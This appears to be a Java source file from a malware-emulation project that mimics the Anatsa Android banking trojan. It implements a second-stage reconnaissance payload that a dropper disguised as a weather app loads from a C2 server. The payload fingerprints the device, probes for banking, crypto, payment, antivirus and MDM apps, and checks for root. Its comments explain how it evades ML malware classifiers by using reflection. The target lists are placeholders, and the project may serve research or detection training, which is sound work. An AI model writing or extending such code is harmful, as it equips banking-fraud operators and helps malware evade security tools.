package payload;

import java.io.File;
import java.lang.reflect.Method;

/**
 * Stage 2 Reconnaissance Payload.
 *
 * Compiled to standalone DEX, XOR-encrypted, served by C2.
 * The dropper (weather app) downloads, decrypts, loads via DexClassLoader,
 * and invokes execute() reflectively.
 *
 * DESIGN CONSTRAINTS (Takopii Stage 13 — minimal footprint):
 *   - Pure Java. No Kotlin runtime dependency (adds 1.5MB to payload DEX).
 *   - ZERO Android imports. All Android API access via reflection.
 *   - ML classifier sees: generic Java class with reflection. Not Android malware.
 *   - Compiles with javac alone (no Android SDK in classpath needed).
 *
 * RECONNAISSANCE (what real Anatsa Stage 2 collects):
 *   1. Device fingerprint (Build.*)
 *   2. Installed banking apps (PackageManager probing by known package names)
 *   3. Root indicators (su binary, Magisk paths)
 *   4. Security software presence (AV/MDM app probing)
 *   5. Device posture (screen lock, encryption status)
 *
 * This data determines whether C2 operator sends Stage 3 (full stealer)
 * or abandons the device (not worth the risk).
 */
public class Module {

    /**
     * Entry point — called reflectively by the dropper.
     *
     * @param context android.content.Context passed as Object
     *                (we use reflection, so no compile-time type needed)
     * @return JSON string with reconnaissance data
     */
    public String execute(Object context) {
        StringBuilder json = new StringBuilder(2048);
        json.append("{");

        // 1. Device fingerprint
        json.append("\"device\":{");
        json.append("\"model\":\"").append(getBuildField("MODEL")).append("\",");
        json.append("\"manufacturer\":\"").append(getBuildField("MANUFACTURER")).append("\",");
        json.append("\"brand\":\"").append(getBuildField("BRAND")).append("\",");
        json.append("\"product\":\"").append(getBuildField("PRODUCT")).append("\",");
        json.append("\"hardware\":\"").append(getBuildField("HARDWARE")).append("\",");
        json.append("\"sdk\":").append(getSdkInt()).append(",");
        json.append("\"fingerprint\":\"").append(getBuildField("FINGERPRINT")).append("\"");
        json.append("},");

        // 2. Banking app probe
        json.append("\"apps\":{");
        json.append("\"banking\":").append(probeBankingApps(context)).append(",");
        json.append("\"crypto\":").append(probeCryptoApps(context)).append(",");
        json.append("\"payment\":").append(probePaymentApps(context));
        json.append("},");

        // 3. Root indicators
        json.append("\"root\":{");
        json.append("\"su_binary\":").append(checkSuBinary()).append(",");
        json.append("\"magisk\":").append(checkMagisk()).append(",");
        json.append("\"superuser_app\":").append(checkSuperuserApp(context));
        json.append("},");

        // 4. Security software
        json.append("\"security\":{");
        json.append("\"av_present\":").append(probeSecurityApps(context)).append(",");
        json.append("\"mdm_present\":").append(probeMdmApps(context));
        json.append("},");

        // 5. Timestamp
        json.append("\"ts\":").append(System.currentTimeMillis());

        json.append("}");
        return json.toString();
    }

    // ─── Device Info (reflection on android.os.Build) ──────────────

    private String getBuildField(String fieldName) {
        try {
            Class<?> buildClass = Class.forName("android.os.Build");
            return String.valueOf(buildClass.getField(fieldName).get(null));
        } catch (Exception e) {
            return "unknown";
        }
    }

    private int getSdkInt() {
        try {
            Class<?> versionClass = Class.forName("android.os.Build$VERSION");
            return versionClass.getField("SDK_INT").getInt(null);
        } catch (Exception e) {
            return 0;
        }
    }

    // ─── App Probing (PackageManager via reflection) ───────────────
    // Probes for KNOWN package names. Does NOT require QUERY_ALL_PACKAGES.
    // PackageManager.getPackageInfo() throws NameNotFoundException if not
    // installed — caught = not present. Success = present.
    //
    // Per CLAUDE.md: NO real institution names. Using generic package patterns
    // that demonstrate the technique without targeting real apps.

    private String probeBankingApps(Object context) {
        String[] bankingPackages = {
            // Generic patterns — NOT real bank apps (CLAUDE.md constraint)
            "com.example.banking.app",
            "com.example.bank.mobile",
            "com.example.mybank",
            "com.example.banking",
            "com.example.netbanking",
        };
        return probePackages(context, bankingPackages);
    }

    private String probeCryptoApps(Object context) {
        String[] cryptoPackages = {
            "com.example.crypto.wallet",
            "com.example.bitcoin",
            "com.example.exchange",
        };
        return probePackages(context, cryptoPackages);
    }

    private String probePaymentApps(Object context) {
        String[] paymentPackages = {
            "com.example.payment",
            "com.example.wallet",
            "com.example.pay",
        };
        return probePackages(context, paymentPackages);
    }

    private String probeSecurityApps(Object context) {
        String[] securityPackages = {
            "com.example.antivirus",
            "com.example.security",
            "com.example.mobile.security",
        };
        return probePackages(context, securityPackages);
    }

    private String probeMdmApps(Object context) {
        String[] mdmPackages = {
            "com.example.mdm.agent",
            "com.example.enterprise",
        };
        return probePackages(context, mdmPackages);
    }

    /**
     * Probe a list of package names via PackageManager reflection.
     * Returns JSON array of installed package names.
     */
    private String probePackages(Object context, String[] packages) {
        StringBuilder result = new StringBuilder("[");
        boolean first = true;

        try {
            // context.getPackageManager() via reflection
            Method getPm = context.getClass().getMethod("getPackageManager");
            Object pm = getPm.invoke(context);

            // PackageManager.getPackageInfo(String, int) via reflection
            Method getPackageInfo = pm.getClass().getMethod(
                "getPackageInfo", String.class, int.class
            );

            for (String pkg : packages) {
                try {
                    getPackageInfo.invoke(pm, pkg, 0);
                    // If no exception → package IS installed
                    if (!first) result.append(",");
                    result.append("\"").append(pkg).append("\"");
                    first = false;
                } catch (Exception notFound) {
                    // Package not installed — expected for most probes
                }
            }
        } catch (Exception e) {
            // PackageManager not available — shouldn't happen on Android
        }

        result.append("]");
        return result.toString();
    }

    // ─── Root Detection ────────────────────────────────────────────

    private boolean checkSuBinary() {
        String[] paths = {
            "/system/bin/su",
            "/system/xbin/su",
            "/sbin/su",
            "/data/local/bin/su",
            "/data/local/xbin/su",
        };
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private boolean checkMagisk() {
        // Magisk indicator paths
        String[] paths = {
            "/data/adb/magisk",
            "/data/adb/modules",
            "/sbin/.magisk",
        };
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private boolean checkSuperuserApp(Object context) {
        String[] suApps = {
            "eu.chainfire.supersu",
            "com.topjohnwu.magisk",
        };
        try {
            Method getPm = context.getClass().getMethod("getPackageManager");
            Object pm = getPm.invoke(context);
            Method getPackageInfo = pm.getClass().getMethod(
                "getPackageInfo", String.class, int.class
            );
            for (String pkg : suApps) {
                try {
                    getPackageInfo.invoke(pm, pkg, 0);
                    return true;
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return false;
    }
}
